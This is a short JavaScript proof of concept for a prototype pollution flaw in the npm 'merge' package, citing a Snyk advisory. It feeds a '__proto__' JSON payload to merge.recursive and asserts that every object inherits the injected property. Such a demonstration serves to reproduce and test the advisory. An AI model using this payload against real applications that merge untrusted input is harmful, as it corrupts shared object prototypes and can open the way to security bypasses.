//https://snyk.io/vuln/SNYK-JS-MERGE-1042987

const merge = require('merge');
const { assert } = require("@firebase/util");
const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');

let obj1 = {x: {y:1}};

console.log("Before : " + obj1.polluted);
merge.recursive(obj1, payload2);
console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");